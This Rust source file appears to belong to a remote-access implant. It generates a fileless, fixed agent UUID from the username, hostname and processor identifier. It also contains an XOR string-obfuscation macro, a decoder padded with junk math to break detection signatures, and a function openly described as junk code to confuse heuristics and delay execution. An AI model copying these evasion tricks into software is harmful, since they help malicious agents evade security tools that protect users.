// Agent Identity Utils - 无文件持久化身份识别
//
// 通过系统特征生成固定的 Agent UUID，无需在磁盘上存储任何文件
// 使用用户 SID、机器名、处理器架构等特征进行哈希计算

use sha2::{Sha256, Digest};
use uuid::Builder;
use log::{debug, warn};

/// Simple compile-time XOR obfuscation for strings
#[macro_export]
macro_rules! obf_str {
    ($s:expr) => {{
        let bytes = $s.as_bytes();
        let mut obf = Vec::with_capacity(bytes.len());
        for b in bytes {
            obf.push(b ^ 0x42); // Simple XOR key
        }
        obf
    }};
}

pub fn decode_obf(bytes: &[u8]) -> String {
    let mut decoded = Vec::with_capacity(bytes.len());
    let mut _junk = 0;
    for (i, b) in bytes.iter().enumerate() {
        // Add junk math to break the signature of the loop
        _junk = (i as u32).wrapping_add(0xDEADBEEF).count_ones();
        decoded.push(b ^ 0x42);
    }
    // Prevent optimization of junk
    if _junk > 999 { return String::new(); }
    
    String::from_utf8_lossy(&decoded).to_string()
}

/// 生成基于系统特征的固定 Agent UUID
/// 
/// 该函数通过以下步骤生成唯一且固定的 Agent 标识符：
/// 1. 获取当前用户的 SID（安全标识符）
/// 2. 获取计算机名作为盐值
/// 3. 获取处理器架构信息
/// 4. 将所有特征拼接并进行 SHA256 哈希
/// 5. 使用哈希结果的前 16 字节构造 UUID
/// 
/// # 特点
/// - 无文件持久化：不在磁盘上存储任何标识文件
/// - 权限友好：普通用户和访客用户均可执行
/// - 唯一性保证：同一台机器的同一用户始终生成相同 UUID
/// - 碰撞防护：不同机器或不同用户生成不同 UUID
/// 
/// # 返回值
/// 返回格式化的 UUID 字符串，例如：`550e8400-e29b-41d4-a716-446655440000`
pub fn get_agent_uuid() -> String {
    let mut identifier = String::new();
    
    // 1. 获取当前用户名称 (代替 whoami 命令)
    debug!("Getting username...");
    let user = whoami::username();
    if !user.is_empty() {
        identifier.push_str(&user);
        debug!("Username obtained: {}", user);
    } else {
        warn!("Failed to get username");
    }
    
    // 2. 注入计算机名作为盐值 (防止不同机器相同用户 SID 的碰撞)
    debug!("Getting hostname...");
    let host = hostname::get()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    if !host.is_empty() {
        identifier.push_str(&host);
        debug!("Hostname obtained: {}", host);
    } else {
        warn!("Failed to get hostname");
    }
    
    // 3. 注入处理器架构特征
    debug!("Getting processor identifier...");
    if let Ok(arch) = std::env::var("PROCESSOR_IDENTIFIER") {
        identifier.push_str(&arch);
        debug!("Processor identifier obtained: {}", arch);
    } else {
        warn!("Failed to get processor identifier");
    }
    
    // 如果所有特征都获取失败，使用备用方案
    if identifier.is_empty() {
        warn!("All system features failed, using fallback method");
        // 使用用户名和计算机名作为备用
        if let Ok(username) = std::env::var("USERNAME") {
            identifier.push_str(&username);
        }
        if let Ok(computername) = std::env::var("COMPUTERNAME") {
            identifier.push_str(&computername);
        }
        // 如果仍然为空，使用固定字符串（不推荐，但确保程序不会崩溃）
        if identifier.is_empty() {
            identifier = "fallback-agent-id".to_string();
        }
    }
    
    debug!("Final identifier string length: {}", identifier.len());
    
    // 4. 执行 SHA256 运算
    let mut hasher = Sha256::new();
    hasher.update(identifier.as_bytes());
    let result = hasher.finalize();
    
    // 5. 将哈希结果的前 16 字节构造为 UUID
    let bytes: [u8; 16] = result[..16].try_into().expect("Invalid hash length");
    let agent_uuid = Builder::from_bytes(bytes).into_uuid();
    
    let uuid_string = agent_uuid.to_string();
    debug!("Generated agent UUID: {}", uuid_string);
    
    uuid_string
}

/// Junk code to confuse heuristics and delay execution
pub fn junk_data_collector() {
    let mut data = Vec::with_capacity(1000);
    let mut _sum = 0.0;
    
    // 1. Computational noise (Heavy math)
    for i in 1..5000 {
        let val = (i as f64).sqrt().sin().cos();
        data.push(val);
        if i % 10 == 0 {
            _sum += val;
        }
    }

    // 2. Benign file system interaction (Reading a public system directory)
    // This looks like a legitimate system utility scanning its environment
    #[cfg(windows)]
    {
        let path = "C:\\Windows\\System32\\drivers\\etc";
        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.take(5) {
                if let Ok(e) = entry {
                    let _ = e.file_name();
                }
            }
        }
    }

    // 3. String manipulation noise
    let mut s = String::from("INIT_SEQ_");
    for i in 0..50 {
        s.push_str(&format!("{:x}", (i * 12345) % 0xFFFF));
    }
    
    // Safety check to prevent optimization
    if _sum > 1e10 || s.len() > 1000000 {
        println!("State: {} {}", _sum, s);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_get_agent_uuid_consistency() {
        // 测试多次调用是否返回相同的 UUID
        let uuid1 = get_agent_uuid();
        let uuid2 = get_agent_uuid();
        
        assert_eq!(uuid1, uuid2, "UUID should be consistent across calls");
        assert!(!uuid1.is_empty(), "UUID should not be empty");
        
        // 验证 UUID 格式
        assert_eq!(uuid1.len(), 36, "UUID should be 36 characters long");
        assert_eq!(uuid1.chars().filter(|&c| c == '-').count(), 4, "UUID should have 4 hyphens");
    }
    
    #[test]
    fn test_uuid_format() {
        let uuid = get_agent_uuid();
        
        // 验证 UUID 格式：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
        let parts: Vec<&str> = uuid.split('-').collect();
        assert_eq!(parts.len(), 5, "UUID should have 5 parts separated by hyphens");
        assert_eq!(parts[0].len(), 8, "First part should be 8 characters");
        assert_eq!(parts[1].len(), 4, "Second part should be 4 characters");
        assert_eq!(parts[2].len(), 4, "Third part should be 4 characters");
        assert_eq!(parts[3].len(), 4, "Fourth part should be 4 characters");
        assert_eq!(parts[4].len(), 12, "Fifth part should be 12 characters");
    }
}